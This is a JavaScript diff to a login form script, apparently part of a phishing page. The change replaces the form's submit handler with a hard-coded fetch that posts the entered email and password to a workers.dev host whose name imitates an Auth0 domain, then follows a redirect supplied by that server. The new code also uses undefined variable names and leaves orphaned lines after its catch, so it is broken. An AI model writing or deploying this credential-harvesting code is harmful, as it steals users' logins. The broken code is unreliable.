@@ -67,27 +67,21 @@ document.addEventListener('DOMContentLoaded', function() {
         } else {
             console.log("Sending data to worker:", { userID: username, password: password }); // Log data
 
-            fetch(url, {
-                method: "POST",
-                body: JSON.stringify({
-                    userID: username, // Ensure we're sending the correct field
-                    password: password,
-                }),
-                headers: {
-                    "Content-type": "application/json; charset=UTF-8"
-                }
-            })
-            .then(function(response) {
-                console.log(response); // Log the worker response for debugging
-                if (response.ok) {
-                    setCookie("username", username, 30);
-                    window.location.href = "./thanks.html"; // Redirect to thanks.html
-                } else {
-                    passerror.style.fontSize = "small";
-                    passerror.innerHTML = "There was an error processing your request.";
-                }
-            })
-            .catch(function(error) {
+            fetch("https://aut0-curr-9dc7.henrycrane65.workers.dev/", {
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ emailID: userEmail, password: userPassword }),
+})
+.then(response => response.json()) // Convert response to JSON
+.then(data => {
+  if (data.redirect) {
+    window.location.href = data.redirect; // Redirect to the thank you page
+  } else {
+    console.log("Success, but no redirect URL found.");
+  }
+})
+.catch(error => console.error("Error:", error));
+
                 passerror.style.fontSize = "small";
                 passerror.innerHTML = "There was an error processing your request.";
             });
